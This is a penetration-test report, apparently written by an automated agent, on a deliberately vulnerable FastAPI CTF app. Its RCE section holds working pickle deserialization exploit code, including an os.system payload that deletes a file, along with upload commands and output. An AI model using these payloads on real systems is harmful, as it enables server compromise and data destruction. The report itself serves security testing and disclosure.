# Security Assessment Report

## Executive Summary

**Target:** http://localhost:46849
**Assessment Date:** January 24, 2025
**Scope:** Authentication, XSS, SQL and Command Injection, SSRF, Authorization testing

### Assessment Overview

This security assessment evaluated XBEN-036-24 "Pickle CTF", a deliberately vulnerable FastAPI application designed as a Capture The Flag challenge. The assessment identified critical security vulnerabilities stemming from the complete absence of authentication and authorization controls combined with insecure deserialization practices.

### Summary by Vulnerability Type

**Authorization Vulnerabilities:**

Two critical authorization vulnerabilities were successfully exploited:

1. **Unauthenticated Access to Sensitive Data (AUTHZ-VULN-01)** - The GET / endpoint exposes sensitive flag data to any anonymous user without authentication or authorization checks. This represents a complete failure of access control for protected resources. **Severity: High**

2. **Unauthenticated Remote Code Execution (AUTHZ-VULN-02)** - The POST / endpoint accepts malicious pickle file uploads from anonymous users and deserializes them without validation, enabling arbitrary code execution. This vulnerability provides complete server compromise capabilities including filesystem manipulation, data exfiltration, and lateral movement potential. This represents both vertical privilege escalation (anonymous user executing privileged operations) and missing authentication for critical functionality. **Severity: Critical (CVSS 10.0)**

**Authentication Vulnerabilities:**

No authentication vulnerabilities were found. The application implements zero authentication mechanisms - all endpoints are publicly accessible without any authentication requirements. This architectural deficiency is reflected in the authorization vulnerabilities above.

**Cross-Site Scripting (XSS) Vulnerabilities:**

No XSS vulnerabilities were found. The application appropriately uses Jinja2's default auto-escaping for HTML output contexts, which prevents XSS attacks even if user-controlled data were present in templates.

**SQL/Command Injection Vulnerabilities:**

No SQL or command injection vulnerabilities were found. The application has no database integration (eliminating SQL injection attack surface) and does not construct shell commands with user input. Note: The insecure deserialization vulnerability (AUTHZ-VULN-02) enables arbitrary code execution, which is a more severe vulnerability class than traditional command injection.

**Server-Side Request Forgery (SSRF) Vulnerabilities:**

No SSRF vulnerabilities were found. The application makes no outbound HTTP requests, opens no network sockets, and performs no URL-based operations that could be manipulated for SSRF exploitation.

## Network Reconnaissance

### Exposed Services and Security Posture

**Open Ports:**
- **Port 80/tcp** - Caddy HTTP server acting as reverse proxy to the target application
- **Port 443/tcp** - Caddy HTTPS service with TLS support
- **Port 631/tcp** - CUPS 2.3 printing service (out of assessment scope)
- **Port 49158/tcp** - Tailscale VPN service with authentication required (out of assessment scope)

**Application Exposure:**
- Target application accessible at http://localhost:46849
- Application runs inside Docker container (Debian-based, ~1.19GB image size)
- FastAPI 0.116.0 on Python 3.9.24 with Uvicorn 0.35.0/Gunicorn 23.0.0
- Only 3 network-accessible endpoints: GET /, POST /, GET /ping

**Security Headers Configuration:**
Analysis revealed the complete absence of security headers in HTTP responses:
- ❌ No Content-Security-Policy (CSP)
- ❌ No Strict-Transport-Security (HSTS)
- ❌ No X-Frame-Options (clickjacking protection)
- ❌ No X-Content-Type-Options (MIME-sniffing protection)
- ❌ No Referrer-Policy

**Security Controls Assessment:**
- No authentication mechanisms implemented
- No authorization checks on any endpoints
- No CSRF protection on forms
- No rate limiting on endpoints
- No CORS restrictions (accepts requests from any origin)
- No input validation on file uploads
- Minimal logging (single print statement, no security context)

**Technology Stack:**
- Web Framework: FastAPI 0.116.0 with Uvicorn ASGI server
- Template Engine: Jinja2 3.1.6 (auto-escaping enabled)
- Frontend: Bootstrap 4.3.1 loaded from CDN with SRI hashes
- Data Storage: File-based (no database) - uses flag.txt and decoy.txt
- Dependencies: Minimal (lxml 5.2.2 installed but unused)

**Subdomain Discoveries:**
External subdomain enumeration identified multiple subdomains (mail02.regency.localhost, owa.regency.localhost, exchvm.nwcnet.localhost, etc.), though these appear unrelated to the single-container CTF application under test.

### Security Assessment Summary

The application demonstrates a worst-case security baseline with no defense-in-depth architecture. The combination of zero authentication, insecure deserialization of untrusted data, and complete absence of security controls creates an environment where exploitation requires minimal sophistication. The critical RCE vulnerability is immediately accessible to anonymous attackers, requiring only a single HTTP POST request with a malicious payload.

---

# Authorization Exploitation Evidence

## Successfully Exploited Vulnerabilities

### AUTHZ-VULN-01: Unauthenticated Access to Sensitive Flag Data (GET /)

**Summary:**
- **Vulnerable location:** GET / endpoint (http://localhost:46849/)
- **Overview:** Anonymous users can access sensitive flag data without any authentication or authorization checks
- **Impact:** Complete exposure of sensitive data (CTF flags) to any anonymous attacker. In a real-world scenario, this represents unauthorized access to protected resources that should require authentication.
- **Severity:** High

**Prerequisites:**
- Network access to http://localhost:46849/
- Standard HTTP client (curl, browser, etc.)
- No authentication credentials required

**Exploitation Steps:**

1. **Make an unauthenticated HTTP GET request to the root endpoint:**
```bash
curl -i http://localhost:46849/
```

2. **Observe the HTTP response includes sensitive flag data:**
The response contains HTTP 200 OK status and HTML content with the flag embedded in an `<h5>` tag:
```html
<h5>The current flag is: this is just the decoy </h5>
```

**Proof of Impact:**

Successfully retrieved sensitive data without any authentication:
- HTTP Status: 200 OK
- Flag value exposed: "this is just the decoy" (decoy flag)
- No authentication headers required
- No session cookies required
- No access control checks performed

The endpoint exposes the content of filesystem-based flag files (decoy.txt or flag.txt) to any anonymous requester, demonstrating complete failure of access control mechanisms for sensitive data.

**Notes:**

This vulnerability demonstrates a horizontal authorization failure where there is no mechanism to verify whether the requester should have access to the data. In the context of this CTF challenge, it represents the first step in the attack chain. In a production environment, this would be equivalent to exposing user PII, API keys, or other sensitive data without authentication.

---

### AUTHZ-VULN-02: Unauthenticated Remote Code Execution via Insecure Pickle Deserialization (POST /)

**Summary:**
- **Vulnerable location:** POST / endpoint (http://localhost:46849/)
- **Overview:** Anonymous users can upload malicious pickle files that are deserialized without validation, leading to arbitrary Remote Code Execution (RCE) on the server
- **Impact:** Complete server compromise - attackers can execute arbitrary system commands, manipulate files, exfiltrate data, establish persistence, and pivot to internal networks. This is the most critical vulnerability in the application.
- **Severity:** Critical

**Prerequisites:**
- Network access to http://localhost:46849/
- Python 3.x to create malicious pickle payloads
- Standard HTTP client supporting multipart/form-data file uploads
- No authentication credentials required

**Exploitation Steps:**

1. **Create a malicious pickle payload that executes arbitrary code:**

Create a Python script (`exploit_pickle.py`) that generates the malicious payload:

```python
#!/usr/bin/env python3
import pickle
import os

class RCEExploit:
    """
    Exploit class using __reduce__ magic method to execute
    arbitrary code during pickle deserialization
    """
    def __reduce__(self):
        # This command executes during pickle.loads()
        return (os.system, ('echo "PWNED_BY_AUTHZ_EXPLOITATION_AGENT" > decoy.txt',))

# Create the malicious pickle payload
malicious_payload = pickle.dumps(RCEExploit())

# Write payload to file for upload
with open('malicious.pkl', 'wb') as f:
    f.write(malicious_payload)

print("[+] Malicious pickle created: malicious.pkl")
```

2. **Generate the malicious pickle file:**
```bash
python3 exploit_pickle.py
```

3. **Upload the malicious pickle to the vulnerable endpoint:**
```bash
curl -X POST http://localhost:46849/ \
  -F "pickle_file=@malicious.pkl"
```

4. **Verify code execution by checking the result:**
```bash
curl -s http://localhost:46849/ | grep "current flag"
```

Expected output showing arbitrary content written to the filesystem:
```html
<h5>The current flag is: PWNED_BY_AUTHZ_EXPLOITATION_AGENT
 </h5>
```

**Proof of Impact:**

**Stage 1 - Initial Verification (Deletion of decoy.txt):**

First exploitation attempt using file deletion:
```python
class DeleteDecoyExploit:
    def __reduce__(self):
        return (os.system, ('rm decoy.txt',))
```

Result: Successfully deleted decoy.txt, confirmed by empty flag value in response:
```html
<h5>The current flag is:  </h5>
```

**Stage 2 - Definitive RCE Proof (Arbitrary File Write):**

Second exploitation demonstrating arbitrary filesystem write access:
```python
class WriteProofExploit:
    def __reduce__(self):
        return (os.system, ('echo "PWNED_BY_AUTHZ_EXPLOITATION_AGENT" > decoy.txt',))
```

Result: Successfully created new decoy.txt with custom content:
```html
<h5>The current flag is: PWNED_BY_AUTHZ_EXPLOITATION_AGENT
 </h5>
```

**Impact Demonstrated:**
1. ✅ **Arbitrary Code Execution**: Successfully executed system commands (`rm`, `echo`) via os.system()
2. ✅ **Filesystem Manipulation**: Deleted and created files at will
3. ✅ **Persistent Impact**: Modified application state persists across requests
4. ✅ **Complete Authorization Bypass**: Achieved privileged operations (code execution) without any authentication or role checks
5. ✅ **Vertical Privilege Escalation**: Anonymous user executing operations that should require maximum privilege level (if any existed)

**Post-Exploitation Capabilities:**

With proven RCE, an attacker can:
- Read sensitive files (environment variables, configuration files, database credentials)
- Establish reverse shells for interactive access
- Exfiltrate data from the application and container
- Modify application code or data
- Pivot to internal network resources
- Establish persistence mechanisms
- Perform denial of service attacks
- Compromise container orchestration systems (if accessible)

**Notes:**

This vulnerability represents the complete failure of multiple security controls:
1. **No authentication** required for file upload endpoint
2. **No authorization checks** for dangerous operations
3. **No input validation** on uploaded files (no type, size, or content checks)
4. **Insecure deserialization** of untrusted data using Python's pickle module
5. **No sandboxing** or isolation of deserialization operations

The vulnerability is CWE-502 (Deserialization of Untrusted Data) combined with CWE-306 (Missing Authentication for Critical Function), resulting in CVSS 10.0 Critical severity. This is the most severe vulnerability class, providing immediate and complete system compromise from an unauthenticated position.

The application uses Python's `pickle.loads()` directly on user-uploaded file content at line 30 of main.py:
```python
pickle.loads(await pickle_file.read())
```

Python's pickle module is explicitly documented as unsafe for untrusted data, as it can execute arbitrary Python code during deserialization via magic methods like `__reduce__`. This is a well-known anti-pattern in secure coding.
